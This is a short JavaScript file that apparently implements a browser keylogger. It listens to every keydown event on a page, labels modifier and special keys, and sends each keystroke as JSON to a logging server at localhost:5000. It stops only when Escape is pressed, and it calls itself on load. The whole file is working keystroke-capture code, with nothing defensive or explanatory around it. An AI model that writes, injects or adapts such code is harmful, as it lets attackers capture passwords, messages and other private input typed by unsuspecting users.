function myfunction() {
    let logging = true;

    const sendToServer = (key) => {
        const data = JSON.stringify({ key: key });

        fetch('http://localhost:5000/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length,
            },
            body: data,
        })
        .then(response => response.text())
        .then(text => console.log(text))
        .catch(error => console.error('Error:', error));
    };

    document.addEventListener('keydown', (event) => {
        if (!logging) return;

        let keyName = '';

        if (event.shiftKey) {
            keyName += '[SHIFT] + ';
        }
        if (event.ctrlKey) {
            keyName += '[CTRL] + ';
        }
        if (event.altKey) {
            keyName += '[ALT] + ';
        }
        if (event.metaKey) {
            keyName += '[META] + ';
        }

        switch (event.key) {
            case ' ':
                keyName += '[SPACE]';
                break;
            case 'Enter':
                keyName += '[ENTER]';
                break;
            case 'Backspace':
                keyName += '[BACKSPACE]';
                break;
            case 'Tab':
                keyName += '[TAB]';
                break;
            case 'Escape':
                console.log('Escape key pressed. Stopping keylogger.');
                logging = false; // Stop logging
                return;
            default:
                if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey) {
                    keyName = event.key;
                } else if (event.key) {
                    keyName += event.key.toUpperCase();
                }
                break;
        }

        //console.log(keyName);

        sendToServer(keyName);
    });
}

myfunction();
